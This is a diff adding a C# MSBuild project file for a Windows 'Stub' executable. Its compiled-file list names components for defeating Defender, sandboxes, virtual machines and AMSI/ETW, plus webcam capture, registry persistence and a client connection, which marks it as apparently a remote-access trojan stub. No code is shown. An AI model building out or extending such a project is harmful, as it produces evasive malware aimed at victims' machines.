@@ -1,0 +1,81 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{5B94872D-962A-48C7-A2A9-D58C8E2DF5D0}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>Stub</RootNamespace>
+    <AssemblyName>rinchan</AssemblyName>
+    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <StartupObject>Stub.Program</StartupObject>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="System">
+      <HintPath>..\..\dnSpy-net-win64\bin\System.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Core">
+      <HintPath>..\..\dnSpy-net-win64\bin\System.Core.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Windows.Forms" />
+  </ItemGroup>
+  <ItemGroup>
+    <AppDesigner Include="Properties\" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Helper\AntiDefender.cs" />
+    <Compile Include="Helper\AntiProcess.cs" />
+    <Compile Include="Helper\AntiSandBox.cs" />
+    <Compile Include="Helper\AntiVirtual.cs" />
+    <Compile Include="Helper\AsmiAndETW.cs" />
+    <Compile Include="Helper\Camera.cs" />
+    <Compile Include="Helper\Client.cs" />
+    <Compile Include="Helper\CryptString\Caesars.cs" />
+    <Compile Include="Helper\Delegates.cs" />
+    <Compile Include="Helper\DInvokeCore.cs" />
+    <Compile Include="Helper\DllImport.cs" />
+    <Compile Include="Helper\HwidGen.cs" />
+    <Compile Include="Helper\Install.cs" />
+    <Compile Include="Helper\Methods.cs" />
+    <Compile Include="Helper\MutexControl.cs" />
+    <Compile Include="Helper\PROCESSENTRY32.cs" />
+    <Compile Include="Helper\SecrityHiden.cs" />
+    <Compile Include="Helper\SetRegistry.cs" />
+    <Compile Include="Helper\Settings.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="akbfsdfytwgf" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.manifest" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
